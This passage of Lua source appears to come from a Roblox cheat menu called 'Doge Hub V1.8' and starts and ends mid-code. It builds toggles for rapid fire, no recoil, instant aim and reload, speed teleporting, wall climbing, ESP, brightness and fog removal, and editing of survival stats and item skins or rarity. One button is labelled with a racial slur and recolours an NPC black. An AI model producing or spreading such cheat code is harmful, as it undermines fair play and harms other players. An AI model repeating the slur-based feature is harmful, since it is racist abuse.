        local screenGui = Instance.new("ScreenGui")
        screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

        textLabel = Instance.new("TextLabel")
        textLabel.Parent = screenGui
        textLabel.Text = ""
        textLabel.TextColor3 = Color3.new(0, 1, 0)
        textLabel.BackgroundTransparency = 1
        textLabel.Position = UDim2.new(0.5, 0, 0.9, 0) -- Positioning slightly down the middle
        textLabel.AnchorPoint = Vector2.new(0.5, 0.5)
        textLabel.Font = Enum.Font.SourceSansBold
        textLabel.TextSize = 24 -- Medium-sized text
    end
end

-- Function to check if the player is visible
local function isPlayerVisible(target)
    if target and target.Parent:FindFirstChild("HumanoidRootPart") then
        local camera = workspace.CurrentCamera
        local humanoidRootPart = target.Parent.HumanoidRootPart
        local ray = Ray.new(camera.CFrame.Position, (humanoidRootPart.Position - camera.CFrame.Position).unit * 5000)
        local part, position = workspace:FindPartOnRayWithIgnoreList(ray, {camera, game.Players.LocalPlayer.Character})

        if part and part:IsDescendantOf(target.Parent) then
            return true
        end
    end
    return false
end

local function sendNotification3()
    game.StarterGui:SetCore("SendNotification", {
        Title = "Welcome To Doge Hub V1.8";
        Text = "Welcome To V1.8 Report Bugs";
        Duration = 6;
    })
end

sendNotification3()

-- Function to toggle visibility checking
local function toggleVisibilityCheck()
    isCheckingVisibility = not isCheckingVisibility

    if isCheckingVisibility then
        createVisibilityText()

        connection = game:GetService("RunService").RenderStepped:Connect(function()
            local target = game.Players.LocalPlayer:GetMouse().Target
            if isPlayerVisible(target) then
                textLabel.Text = "Player Visible"
            else
                textLabel.Text = ""
            end
        end)
    else
        if connection then
            connection:Disconnect()
            connection = nil
        end
        if textLabel then
            textLabel.Text = ""
        end
    end
end
local isEnabled883 = false  -- Global variable to track whether the script is enabled or disabled
local LC = game.Players.LocalPlayer

local function toggleBunnyHop()
    isEnabled883 = not isEnabled883
    Library:Notify("Bunny Hop " .. isEnabled883 .."")
    print("Bunny Hop is now", isEnabled883 and "enabled" or "disabled")
end

game:GetService("RunService").RenderStepped:Connect(function()
    if isEnabled883 then
        LC.Character.Humanoid:SetAttribute("JumpCooldown", 0)
    end
end)





-- Global variables
local speedMultiplier = 1 -- Default speed multiplier
local viewModel = nil
local animator = nil
local monitoring = true -- To control the loop

-- Function to change the speed of all currently playing animations
local function changeAnimationSpeed(multiplier)
    if animator then
        for _, animTrack in pairs(animator:GetPlayingAnimationTracks()) do
            animTrack:AdjustSpeed(multiplier)
        end
    end
end
local Workspace = game.Workspace
-- Function to set up the Animator
local function setupAnimator()
    viewModel = Workspace:FindFirstChild("Camera") and Workspace.Camera:FindFirstChild("ViewModel")
    if viewModel then
        local humanoid = viewModel:FindFirstChild("Humanoid")
        if humanoid then
            animator = humanoid:FindFirstChildOfClass("Animator")
            if animator then
                -- Apply speed to currently playing animations
                changeAnimationSpeed(speedMultiplier)
                
                -- Adjust speed for any new animations that start playing
                animator.AnimationPlayed:Connect(function(animTrack)
                    animTrack:AdjustSpeed(speedMultiplier)
                end)
                
                return true
            else
                warn("Animator not found in Humanoid")
            end
        else
            warn("Humanoid not found in ViewModel")
        end
    else

    end
    return false
end

-- Function to continuously check for ViewModel and update Animator
local function monitorViewModel()
    while monitoring do
        local hasViewModel = setupAnimator()

        if not hasViewModel then
            animator = nil
            viewModel = nil
        end

        wait(1) -- Check every second, adjust as needed
    end
end

-- Function to toggle animation speed adjustment
local function toggleAnimationSpeed(enable)
    if enable and animator then
        -- Apply the speed multiplier to currently playing animations
        changeAnimationSpeed(speedMultiplier)
    else
        -- Optional: You might want to reset speed or handle disabling here if needed
        print("Animation speed adjustment disabled.")
    end
end

-- Slider or value control for speedMultiplier
local function setSpeedMultiplier(value)
    speedMultiplier = value
    toggleAnimationSpeed(true) -- Reapply speed with new multiplier
end

-- Adding Toggle to aimtab
LeftGroupBox:AddToggle('InstantReload', {
    Text = 'Instant Reload',
    Tooltip = 'Instant Reload',
    Default = false,
    
    Callback = function(isToggled)
        if isToggled then
            -- Enable instant reload and set high speed
            setSpeedMultiplier(100)
        else
            -- Disable instant reload and reset to normal speed
            setSpeedMultiplier(1)
        end
    end
})

-- Start monitoring the ViewModel in a coroutine to avoid blocking the main thread
coroutine.wrap(monitorViewModel)()

local function nostalgiaModePd(enabled)
    if enabled then
        game.Lighting.Brightness = 14
        game.Lighting.GlobalShadows = false
        game.Lighting.Technology = Enum.Technology.Compatibility
    else
        game.Lighting.Brightness = 1
        game.Lighting.GlobalShadows = true
        game.Lighting.Technology = Enum.Technology.Future
    end
end

LeftGroupBox:AddToggle('NostalgiaMode', {
    Text = 'Old Times Mode',
    Tooltip = 'Old Times Mode',
    Default = false,

    Callback = function(enabled)
        if enabled then
            nostalgiaModePd(true)
        else
            nostalgiaModePd(false)
        end
    end
})

local function printFolderNames(parent)
    for _, child in ipairs(parent:GetChildren()) do
        if child:IsA("Folder") then
            print(child.Name)
        end
    end
end

-- Example usage
local directory = game.ReplicatedStorage.Clans -- or any other parent instance

LeftGroupBox:AddButton('Nigga Whisper', function()

    -- Destroy clothing items
    game.ReplicatedStorage.AiPresets.WhisperAI.Pants:Destroy()
    game.ReplicatedStorage.AiPresets.WhisperAI.Shirt:Destroy()
    
    -- Retrieve the BodyColors instance
    local bodyColors = game.ReplicatedStorage.AiPresets.WhisperAI["Body Colors"]
    
    -- Function to change body colors to dark
    local function setDarkColors()
        -- Check if BodyColors instance exists
        if bodyColors and bodyColors:IsA("BodyColors") then
            -- Set all color properties to dark color
            bodyColors.HeadColor = BrickColor.new("Black")
            bodyColors.LeftArmColor = BrickColor.new("Black")
            bodyColors.LeftLegColor = BrickColor.new("Black")
            bodyColors.RightArmColor = BrickColor.new("Black")
            bodyColors.RightLegColor = BrickColor.new("Black")
            bodyColors.TorsoColor = BrickColor.new("Black")
        else
            warn("BodyColors instance not found or invalid.")
        end
    end
    
    -- Apply the dark colors
    setDarkColors()

end)

LeftGroupBox:AddButton('Destroy Look At (Whisper)', function()

game.ReplicatedStorage.AiPresets.WhisperAI.LookAt:Destroy()


 end)

-- Desired fire rate
local newFireRate = 0.001  -- Set the fire rate to a faster value
local originalFireRate = 0.1  -- Assuming this is the original fire rate

-- Function to change fire rate for all items in the local player's inventory
local function setFireRateForAllItems(rate)
    -- Get the Inventory folder
    local inventory = game.ReplicatedStorage.Players[localPlayer.Name].Inventory

    -- Check if Inventory exists
    if not inventory then
        print("Inventory not found for player.")
        return
    end

    -- Iterate through all items in the Inventory
    for _, item in pairs(inventory:GetChildren()) do
        -- Check if the item has a SettingsModule
        local settingsModulePath = item:FindFirstChild("SettingsModule")
        if settingsModulePath and settingsModulePath:IsA("ModuleScript") then
            local success, settingsModule = pcall(require, settingsModulePath)
            if success and settingsModule then
                -- Modify the fire rate if it exists
                if settingsModule.FireRate then
                    settingsModule.FireRate = rate
                    print(item.Name .. " fire rate set to: " .. rate)
                else
                    print("No FireRate property found in: " .. item.Name)
                end
            else
                print("Failed to require SettingsModule for: " .. item.Name)
            end
        end
    end
end

-- Adding a toggle to enable/disable rapid fire
LeftGroupBox:AddToggle('rapidfire', { 
    Text = 'Rapid Fire', 
    Default = false,
    Callback = function(state)
        if state then
            -- Enable rapid fire
            setFireRateForAllItems(newFireRate)  -- Set to desired rapid fire rate
            print("Rapid Fire enabled.")
        else
            -- Disable rapid fire, reset to original fire rate
            setFireRateForAllItems(originalFireRate)  -- Reset to original fire rate
            print("Rapid Fire disabled.")
        end
    end 
})

LeftGroupBox:AddLabel('You Have To Equip your gun again to enable rapid fire.', true)

-- Adding a toggle to enable/disable faster aiming
LeftGroupBox:AddToggle('fasteraim', { 
    Text = 'Instant Aim', 
    Default = false,
    Callback = function(state)
        -- Iterate through each weapon in the local player's inventory
        local inventory = game.ReplicatedStorage.Players[localPlayer.Name].Inventory:GetChildren()
        
        for _, weapon in ipairs(inventory) do
            local settingsModule = require(weapon:WaitForChild("SettingsModule", 5)) -- Wait for the SettingsModule
            
            if settingsModule then
                if state then
                    -- Modify Aim In and Out Speeds
                    settingsModule.AimInSpeed = 0.1  -- Faster aim in
                    settingsModule.AimOutSpeed = 0.1  -- Faster aim out
                else
                    -- Reset to original speeds if necessary
                    settingsModule.AimInSpeed = 0.4  -- Reset to default aim in speed
                    settingsModule.AimOutSpeed = 0.4  -- Reset to default aim out speed
                end

                -- Print to verify
                print("New Aim In Speed for " .. weapon.Name .. ": ", settingsModule.AimInSpeed)
                print("New Aim Out Speed for " .. weapon.Name .. ": ", settingsModule.AimOutSpeed)
            else
                print("SettingsModule not found for " .. weapon.Name)
            end
        end
    end 
})






LeftGroupBox:AddButton('Naked Whisper', function()

game.ReplicatedStorage.AiPresets.WhisperAI.Pants:Destroy()
game.ReplicatedStorage.AiPresets.WhisperAI.Shirt:Destroy()

 end)

LeftGroupBox:AddButton('Print All Clan Names', function()

printFolderNames(directory)

 end)

LeftGroupBox:AddButton('Destroy Drown Remote', function()

game.StarterPlayer.StarterCharacterScripts.Health.Drowning:Destroy()

 end)

LeftGroupBox:AddButton('Destroy Buildables', function()

game.ReplicatedStorage.Buildable:Destroy()

 end)

LeftGroupBox:AddToggle('disabletilt', {
    Text = 'Disable Tilt',
    Tooltip = 'Disable Tilt',
    Default = false,

    Callback = function(isToggled)
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local characterTilt = character:FindFirstChild("CharacterTilt")

        if characterTilt then
            if isToggled then
                characterTilt.Disabled = true
                print("enabled = false")
            else
                characterTilt.Enabled = true
                print("enabled = true")
            end
        else
            warn("CharacterTilt not found in character.")
        end
    end
})


LeftGroupBox:AddToggle('Bunnyhop', {
    Text = 'No Jump Cooldown',
    Tooltip = 'Bunny Hop',
    Default = false,

    Callback = function(first)
        toggleBunnyHop()
    end
})

LeftGroupBox:AddToggle('VisibleText', {
    Text = 'Visible Text',
    Tooltip = 'Tells you if the user you aim is visible or not',
    Default = false,

    Callback = function(first)
        toggleVisibilityCheck()
    end
})

local function norecoil()

for i,v in pairs(ammo:GetChildren()) do
     v:SetAttribute("RecoilStrength", "0")
end

end

LeftGroupBox:AddButton('No Gun Weight', function()

local playerName = game.Players.LocalPlayer.Name

-- Access the player's inventory based on their actual name
local playerInventory = game.ReplicatedStorage.Players[playerName].Inventory



-- Loop through all items in the inventory and set the "MovementModifier" attribute
for _, item in pairs(playerInventory:GetChildren()) do
    if item:FindFirstChild("ItemProperties") and item.ItemProperties:FindFirstChild("Tool") then
        item.ItemProperties.Tool:SetAttribute("MovementModifer", "0")
    end
end


 end)

LeftGroupBox:AddSlider('hydration', {
    Text = 'Hydration Slider',
    Default = 3700,
    Min = 0,
    Max = 3700,
    Rounding = 3,
    Compact = true,
}):OnChanged(function(state)
    local playerName = game.Players.LocalPlayer.Name


local playerInventory = game.ReplicatedStorage.Players[playerName].Status.GameplayVariables


playerInventory.Hydration:SetAttribute("Value", state)
end)


LeftGroupBox:AddSlider('radiationslider', {
    Text = 'Radiation Slider',
    Default = 0,
    Min = 0,
    Max = 800,
    Rounding = 3,
    Compact = true,
}):OnChanged(function(state)
    local playerName = game.Players.LocalPlayer.Name


local playerInventory = game.ReplicatedStorage.Players[playerName].Status.GameplayVariables


playerInventory.Radiation:SetAttribute("Value", state)
end)


LeftGroupBox:AddSlider('legfracture', {
    Text = 'Leg Fracture Slider',
    Default = 0,
    Min = 0,
    Max = 30,
    Rounding = 1,
    Compact = true,
}):OnChanged(function(state)
    local playerName = game.Players.LocalPlayer.Name


local playerInventory = game.ReplicatedStorage.Players[playerName].Status.GameplayVariables


playerInventory.LegFracture:SetAttribute("Value", state)
end)


LeftGroupBox:AddSlider('Bleeding', {
    Text = 'Bleeding Slider',
    Default = 0,
    Min = 0,
    Max = 70,
    Rounding = 1,
    Compact = true,
}):OnChanged(function(state)
    local playerName = game.Players.LocalPlayer.Name


local playerInventory = game.ReplicatedStorage.Players[playerName].Status.GameplayVariables


playerInventory.Bleeding:SetAttribute("Value", state)
end)


LeftGroupBox:AddSlider('hunger', {
    Text = 'Hunger Slider',
    Default = 2000,
    Min = 0,
    Max = 2000,
    Rounding = 3,
    Compact = true,
}):OnChanged(function(state)
    local playerName = game.Players.LocalPlayer.Name


local playerInventory = game.ReplicatedStorage.Players[playerName].Status.GameplayVariables


playerInventory.Hunger:SetAttribute("Value", state)
end)

LeftGroupBox:AddToggle('nograss', {
    Text = 'No Grass',
    Default = false,
    Tooltip = 'Removes Grasses',
    Callback = function(first)
        sethiddenproperty(game:GetService("Workspace").Terrain, "Decoration", not first)
    end
})



-- Ensure that `players` is defined correctly and `skins` is accessible.

 -- Correctly define `LC` as the LocalPlayer
local rp = game:GetService("ReplicatedStorage")
local skins = {
	["762x25MAG"] = "Nutcracker",
	["762x25Rnd71Mag"] = "Arctic",
	["762x25TTMAG"] = "Watergun",
	["762x39MAG"] = "DeltaAnime",
	["762x39Rnd75Mag"] = "Anton",
	["762x54Rnd10Mag"] = "Permafrost",
	["9x18vzMag"] = "GiftWrap",
	["9x19MP443MAG"] = "JollyRoger",
	["9x19MP5MAG"] = "Permafrost",
	["9x39Mag"] = "Shoreline",
	AKMN = "DeltaAnime",
	FrontAKMN = "DeltaAnime",
	HandleRK3AKMN = "DeltaAnime",
	PolymerStockAKMN = "DeltaAnime",
	HandleAKMN = "Valentine",
    Tortilla = "Blackout",
	DV2 = "Cutlass",
	TacticalFrontAKMN = "AnodizedRed",
	SvdFront = "Permafrost",
	MuzzleBrakeAKM = "AnodizedRed",
	CombatGloves = "Anarchy",
	CamoShirt = "Anarchy",
	HandWraps = "SantaCommando",
	WastelandShirt = "SantaCommando",
	M4 = "Devil",
	Lighter = "EarlyAccess",
	GorkaShirt = "Wetsuit",
	GhillieTorso = "Arctic",
	AsVal = "Shoreline",
	F1 = "Pineapple",
	Makarov = "Serpant",
	Mosin = "SkullHunter",
	PPSH41 = "Nutcracker",
	SVD = "Permafrost",
	Saiga12 = "Valentine",
	TT33 = "Watergun",
	ZSh = "Woodland",
	MP5SD  = "Permafrost",
	MP443 = "Whiteout",
	IZh81 = "Watergun",
}

local runSpeedThreshold = 16 -- Normal yürüyüş hızından daha hızlı olduğunda teleportu tetikle
local speed = 0.5 -- Başlangıç teleport hızı
local isRunning = false
local cframeSpeedActive = false -- CFrameSpeed için toggle durumu


-- Function to handle teleport movement while running
local function teleportWhileRunning()
    while isRunning and cframeSpeedActive do -- Toggle aktifse kontrol et
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -speed)
        end
        task.wait(0.03) -- Daha pürüzsüz teleport
    end
end

-- Check when the player is running (speed greater than walk speed)
local function onRunning(walkSpeed)
    if walkSpeed > runSpeedThreshold and cframeSpeedActive then
        if not isRunning then
            isRunning = true
            teleportWhileRunning() -- Koşarken teleportu başlat
        end
    else
        isRunning = false -- Koşma durduğunda veya oyuncu yürüdüğünde teleportu durdur
    end
end

-- Function to initialize the humanoid
local function initializeHumanoid(character)
    humanoid = character:WaitForChild("Humanoid")
    humanoid.Running:Connect(onRunning)
end

-- Initialize with the current character
if player.Character then
    initializeHumanoid(player.Character)
end

-- Listen for player respawn
player.CharacterAdded:Connect(function(newCharacter)
    initializeHumanoid(newCharacter)
end)

-- Adding a slider to control the teleportation speed
Esptab3:AddSlider('CFrameSpeed', {
    Text = 'Speed Slider',
    Default = 0.5, -- Slider için başlangıç değeri
    Min = 0,
    Max = 2, -- Maksimum hız değeri
    Rounding = 3, -- Yuvarlama hassasiyeti
    Compact = false,
}):OnChanged(function(State)
    speed = State -- Slider değeriyle teleport hızını güncelle
end)

-- Adding a toggle to enable/disable CFrameSpeed
Esptab3:AddToggle('cframespeed', {
    Text = 'CFrameSpeed Toggle',
    Default = false,
    Callback = function(state)
        cframeSpeedActive = state
        if not state then
            isRunning = false -- Toggle kapalıyken koşmayı devre dışı bırak
        elseif humanoid and humanoid.MoveDirection.Magnitude > 0 then
            isRunning = true
            teleportWhileRunning() -- Hareket ediyorsa teleport etmeye başla
        end
    end
})





local spiderActive = false -- Toggle state for spider climbing
local spiderSpeed = 1 -- Initial climbing speed

-- Function to handle wall climbing
local function climbWalls()
    while spiderActive do
        local ray = Ray.new(character.HumanoidRootPart.Position, Vector3.new(0, -1, 0)) -- Ray to check for ground
        local hit, position = workspace:FindPartOnRay(ray, character)

        if not hit then -- If not on ground
            local climbDirection = Vector3.new(0, 1, 0) -- Climb upwards
            character.HumanoidRootPart.Velocity = climbDirection * spiderSpeed
        else
            character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0) -- Stop climbing if on the ground
        end

        task.wait(0.03) -- Adjust for smoother climbing
    end
end

-- Adding a toggle to enable/disable spider climbing
Esptab3:AddToggle('spiderToggle', {
    Text = 'Spider Climb',
    Default = false,
    Callback = function(state)
        spiderActive = state
        if spiderActive then
            climbWalls() -- Start climbing when toggled on
        end
    end
})

local thirdPersonDistance = 5 -- Distance for third-person view
local thirdPersonActive = false -- Toggle state for third-person

-- Function to update the camera position
local function updateCamera()
    local character = player.Character
    if thirdPersonActive and character and character:FindFirstChild("HumanoidRootPart") then
        local rootPart = character.HumanoidRootPart
        local cameraOffset = rootPart.CFrame.LookVector * -thirdPersonDistance + Vector3.new(0, 2, 0) -- Adjust Y to raise the camera
        camera.CFrame = CFrame.new(rootPart.Position + cameraOffset, rootPart.Position)
    end
end

-- Hook to update the camera every frame
game:GetService("RunService").RenderStepped:Connect(updateCamera)

-- Toggle to enable/disable third-person camera


local lighting = game:GetService("Lighting")
local fullBrightActive = false -- Track toggle state

local function enableFullBright()
    lighting.Ambient = Color3.fromRGB(255, 255, 255)
    lighting.Brightness = 1
    lighting.FogEnd = 1e10

    for _, v in pairs(lighting:GetDescendants()) do
        if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("SunRaysEffect") then
            v.Enabled = false
        end
    end

    -- Reset lighting settings on change
    lighting.Changed:Connect(function()
        lighting.Ambient = Color3.fromRGB(255, 255, 255)
        lighting.Brightness = 1
        lighting.FogEnd = 1e10
    end)

    -- Add point light to character
    local player = game:GetService("Players").LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    while wait() do
        if character and character:FindFirstChild("HumanoidRootPart") then
            if not character.HumanoidRootPart:FindFirstChildWhichIsA("PointLight") then
                local headlight = Instance.new("PointLight", character.HumanoidRootPart)
                headlight.Brightness = 1
                headlight.Range = 60
            end
        end
        wait(0.5) -- Check every half second
    end
end



local timeValue = 12 -- Default time

-- Function to change the time of day
local function changeTimeOfDay(value)
    lighting.ClockTime = value
end

-- Slider to set time of day
Esptab3:AddSlider('timeSlider', {
    Text = 'Set Time of Day',
    Default = 12, -- Default to noon
    Min = 0, -- Minimum time (midnight)
    Max = 24, -- Maximum time (next midnight)
    Rounding = 1, -- Round to 1 decimal place
    Compact = false,
}):OnChanged(function(value)
    -- Only change the time when the slider is adjusted
    timeValue = value -- Update timeValue with the slider
    changeTimeOfDay(timeValue) -- Apply the new time
end)

-- OPTIONAL: Monitor if the game resets the time and reapply if necessary
game:GetService("RunService").Stepped:Connect(function()
    if lighting.ClockTime ~= timeValue then
        changeTimeOfDay(timeValue) -- Reapply the desired time if it changes
    end
end)




local character = player.Character or player.CharacterAdded:Wait()
local head = character:WaitForChild("Head")

local billboards = {} -- Table to keep track of Billboard GUIs

LeftGroupBox:AddToggle('exitesppdlt', {
    Text = 'Exit ESP',
    Tooltip = 'Shows Exits',
    Default = false,

    Callback = function(first)
        if first then
            -- Function to create a Billboard GUI for each exit
            local function createBillboardGui(exit)
                local billboardGui = Instance.new("BillboardGui")
                billboardGui.Adornee = exit
                billboardGui.Size = UDim2.new(0, 100, 0, 50)
                billboardGui.StudsOffset = Vector3.new(0, 3, 0)
                billboardGui.AlwaysOnTop = true -- Always on top

                local textLabel = Instance.new("TextLabel", billboardGui)
                textLabel.Size = UDim2.new(1, 0, 1, 0)
                textLabel.BackgroundTransparency = 1
                textLabel.Text = "Exit"
                textLabel.TextColor3 = Color3.fromRGB(255, 0, 0) -- Red text
                textLabel.TextScaled = true
                textLabel.Font = Enum.Font.GothamBold -- Change to a better font
                textLabel.TextStrokeTransparency = 0.5 -- Add stroke for better visibility

                -- Update distance and size every frame
                local function updateDisplay()
                    while billboardGui.Parent do
                        local distance = (exit.Position - head.Position).Magnitude
                        textLabel.Text = "Exit\nDistance: " .. math.floor(distance) .. " studs"

                        -- Adjust size based on distance (for visibility)
                        local sizeFactor = math.clamp(200 / distance, 0.5, 2) -- Adjust as needed
                        billboardGui.Size = UDim2.new(0, 100 * sizeFactor, 0, 50 * sizeFactor)

                        wait(0.1) -- Update every 0.1 seconds
                    end
                end

                coroutine.wrap(updateDisplay)() -- Start updating display
                billboardGui.Parent = workspace -- Parent to workspace

                -- Store the Billboard GUI in the table
                table.insert(billboards, billboardGui)
            end

            -- Create Billboard GUIs for existing exits
            for _, exit in next, workspace.NoCollision.ExitLocations:GetChildren() do
                createBillboardGui(exit)
            end

            -- Listen for new exits added
            workspace.NoCollision.ExitLocations.ChildAdded:Connect(function(exit)
                createBillboardGui(exit)
            end)
        else
            -- Remove all Billboard GUIs when toggled off
            for _, billboard in ipairs(billboards) do
                billboard:Destroy()
            end
            billboards = {} -- Clear the table
        end
    end
})



Esptab3:AddButton('no fog', function()
    if Lighting:FindFirstChildOfClass("Atmosphere") then
        Lighting:FindFirstChildOfClass("Atmosphere"):Destroy()
 end
 end)

Esptab3:AddButton("remove foliage", function()
    for _, v in pairs(workspace.SpawnerZones:GetDescendants()) do
        if v.ClassName == "MeshPart" and v:FindFirstChildOfClass("SurfaceAppearance") then
            v:Destroy()
        end
    end
    workspace.SpawnerZones.DescendantAdded:Connect(function(inst)
        if inst.ClassName == "MeshPart" and inst:FindFirstChildOfClass("SurfaceAppearance") then
            inst:Destroy()
        end
    end)
end)


local fullBrightActive = false -- Track toggle state
local oldSettings = {} -- Table to store old lighting settings

local function enableFullBright()
    -- Store old settings
    oldSettings.Ambient = lighting.Ambient
    oldSettings.Brightness = lighting.Brightness
    oldSettings.FogEnd = lighting.FogEnd

    lighting.Ambient = Color3.fromRGB(255, 255, 255)
    lighting.Brightness = 1
    lighting.FogEnd = 1e10

    for _, v in pairs(lighting:GetDescendants()) do
        if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("SunRaysEffect") then
            v.Enabled = false
        end
    end

    -- Reset lighting settings on change
    lighting.Changed:Connect(function()
        lighting.Ambient = Color3.fromRGB(255, 255, 255)
        lighting.Brightness = 1
        lighting.FogEnd = 1e10
    end)

    -- Add point light to character

    local character = player.Character or player.CharacterAdded:Wait()
    while wait() do
        if character and character:FindFirstChild("HumanoidRootPart") then
            if not character.HumanoidRootPart:FindFirstChildWhichIsA("PointLight") then
                local headlight = Instance.new("PointLight", character.HumanoidRootPart)
                headlight.Brightness = 1
                headlight.Range = 60
            end
        end
        wait(0.5) -- Check every half second
    end
end









Esptab3:AddSlider('spiderSpeed', {
    Text = 'Climb Speed',
    Default = 5, -- Initial default value for the slider
    Min = 1,
    Max = 20, -- Maximum speed value
    Rounding = 1, -- Set rounding precision
    Compact = false,
}):OnChanged(function(State)
    spiderSpeed = State -- Update the climbing speed with the slider's value
end)

-- Toggle function to enable or disable third-person mode
local function toggleThirdPerson(enable)
    if enable then
        -- Enable third-person view
        player.CameraMode = Enum.CameraMode.Classic
        player.CameraMaxZoomDistance = 10
        player.CameraMinZoomDistance = 10
        camera.CameraType = Enum.CameraType.Custom
        camera.CameraSubject = player.Character:FindFirstChild("Humanoid")
    else
        -- Disable third-person view
        player.CameraMode = Enum.CameraMode.LockFirstPerson
        camera.CameraType = Enum.CameraType.Custom
        camera.CameraSubject = nil  -- No specific subject in first-person
    end
end

-- Add toggle to the UI
Esptab3:AddToggle('ThirdPerson', {
    Text = 'Third Person',
    Default = false,

    Callback = function(isEnabled)
        toggleThirdPerson(isEnabled)
    end
})


local fullBrightActive = false -- Track toggle state
local oldSettings = {} -- Table to store old lighting settings

local function enableFullBright()
    -- Store old settings
    oldSettings.Ambient = lighting.Ambient
    oldSettings.Brightness = lighting.Brightness
    oldSettings.ShadowSoftness = lighting.ShadowSoftness
    oldSettings.GlobalShadows = lighting.GlobalShadows

    lighting.Ambient = Color3.fromRGB(255, 255, 255)
    lighting.Brightness = 2 -- Increased brightness
    lighting.GlobalShadows = false -- Disable shadows

    -- Disable shadow softness for a flat lighting effect
    lighting.ShadowSoftness = 0
end

local function disableFullBright()
    if oldSettings.Ambient then
        lighting.Ambient = oldSettings.Ambient -- Restore old settings
    end
    if oldSettings.Brightness then
        lighting.Brightness = oldSettings.Brightness
    end
    if oldSettings.GlobalShadows ~= nil then
        lighting.GlobalShadows = oldSettings.GlobalShadows -- Restore shadows
    end
    if oldSettings.ShadowSoftness then
        lighting.ShadowSoftness = oldSettings.ShadowSoftness -- Restore shadow softness
    end
end

-- Toggle to enable/disable full bright
LeftGroupBox:AddToggle('fullBrightToggle', {
    Text = 'Enable Full Bright',
    Default = false,
    Callback = function(state)
        fullBrightActive = state
        if fullBrightActive then
            enableFullBright() -- Enable full bright
        else
            disableFullBright() -- Disable full bright
        end
    end
})


LeftGroupBox:AddButton('Skin Changer', function()

if rp:FindFirstChild("Players") then
    local playersContainer = rp.Players
    local player = playersContainer:FindFirstChild(LC.Name)
    
    if player then
        for _, item in player:GetDescendants() do
            local itemProperties = item:FindFirstChild("ItemProperties")
            if itemProperties and skins[item.Name] then
                itemProperties:SetAttribute("Skin", skins[item.Name])
            end
        end
    end
end


 end)

LeftGroupBox:AddDropdown('raritychanger', {
    Values = { 'Epic', 'Common', 'Legendary', 'Mythical' },
    Default = 1,
    Multi = false,
    Text = 'Rarity Changer',
    Tooltip = 'Works For All Guns!',
    Callback = function(state)
       
local playerName = game.Players.LocalPlayer.Name


local playerInventory = game.ReplicatedStorage.Players[playerName].Inventory


for _, item in pairs(playerInventory:GetChildren()) do

    if item:FindFirstChild("ItemProperties") then

        item.ItemProperties:SetAttribute("Rarity", state)
    end
end



    end
})

LeftGroupBox:AddDropdown('cameradropdown', {
    Values = { 'Attach', 'Custom', 'Fixed', 'Follow', 'Orbital', 'Scriptable', 'Track', 'Watch'},
    Default = 2,
    Multi = false,
    Text = 'Camera Type',
    Tooltip = 'Camera Type',
    Callback = function(state)
        game.workspace.Camera.CameraType = state -- Update the target part based on dropdown selection
    end
})


LeftGroupBox:AddSlider('RecoilStrength', {
    Text = 'Recoil Slider',
    Default = 230,
    Min = 0,
    Max = 300,
    Rounding = 0,
    Compact = false,
}):OnChanged(function(State)
    -- Check if the slider value is zero
    if State == 0 then
        -- Set the recoil strength to "0" for all children of ammo
        for i, v in pairs(ammo:GetChildren()) do
            v:SetAttribute("RecoilStrength", "0")
        end
    else
        -- Set the recoil strength to the slider value for all children of ammo
        for i, v in pairs(ammo:GetChildren()) do
            v:SetAttribute("RecoilStrength", State)
        end
    end
end)

    local limbs = {}
-- Toggle ESP
local function ToggleESP()
    isESPEnabled = not isESPEnabled
    if isESPEnabled then
        for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
            if plr ~= Player then
                DrawESP(plr)
            end
        end
    else
        for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
            if plr ~= Player then
                for i, v in pairs(limbs) do
                    if v and v.Visible then
                        v:Remove()
                    end
                end
            end
        end
    end
end


LeftGroupBox:AddToggle('highlightgun', {
    Text = 'Gun Highlighter',
    Default = false,
    Callback = function(first)
        local highlight
        local item

        -- Coroutine to check for ViewModel existence
        coroutine.wrap(function()
            while true do
                item = game.workspace.Camera:FindFirstChild("ViewModel") and game.workspace.Camera.ViewModel:FindFirstChild("Item")
                if item then
                    highlight = item:FindFirstChildOfClass("Highlight")

                    if first then
                        if not highlight then
                            -- Create a new highlight
                            highlight = Instance.new("Highlight")
                            highlight.Adornee = item
                            highlight.OutlineColor = Color3.fromRGB(128, 0, 128) -- Default Purple color
                            highlight.FillColor = Color3.fromRGB(128, 0, 128) -- Default Purple color
                            highlight.FillTransparency = 1 -- Fully transparent
                            highlight.Parent = item
                        else
                            highlight.Enabled = true
                        end
                    else
                        if highlight then
                            highlight.Enabled = false
                        end
                    end
                end
                wait(0.1) -- Check every 1 second
            end
        end)()
    end
})

LeftGroupBox:AddLabel('Higlighter Color Picker'):AddColorPicker('ColorPickerhiglightergun', {
    Default = Color3.new(0.768627, 0.039216, 0.913725), -- Default color
    Title = 'Higlighter Color Picker',
    Transparency = 0,

    Callback = function(Value)
        local item = game.workspace.Camera:FindFirstChild("ViewModel") and game.workspace.Camera.ViewModel:FindFirstChild("Item")
        if item then
            local highlight = item:FindFirstChildOfClass("Highlight")
            if highlight then
                highlight.OutlineColor = Value -- Update outline color
                highlight.FillColor = Value -- Update fill color
            end
        end
    end
})


local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Sway'i toggle yapacak fonksiyonu tanımla
local swayEnabled = true -- Başlangıçta sway açık olacak

local function toggleSway()
    -- Oyuncunun envanterindeki tüm silahları kontrol et
    local inventory = ReplicatedStorage:FindFirstChild("Players")
        and ReplicatedStorage.Players:FindFirstChild(localPlayer.Name)
        and ReplicatedStorage.Players[localPlayer.Name]:FindFirstChild("Inventory")

    if inventory then
        for _, weapon in pairs(inventory:GetChildren()) do
            local settingsModule = weapon:FindFirstChild("SettingsModule")
            if settingsModule then
                local settings = require(settingsModule)

                if swayEnabled then
                    -- Sway'i kapat
                    settings.swayMult = 0
                    settings.IdleSwayModifier = 0
                    settings.WalkSwayModifer = 0
                    settings.SprintSwayModifer = 0
                    print(weapon.Name .. " için sway kapatıldı.")
                else
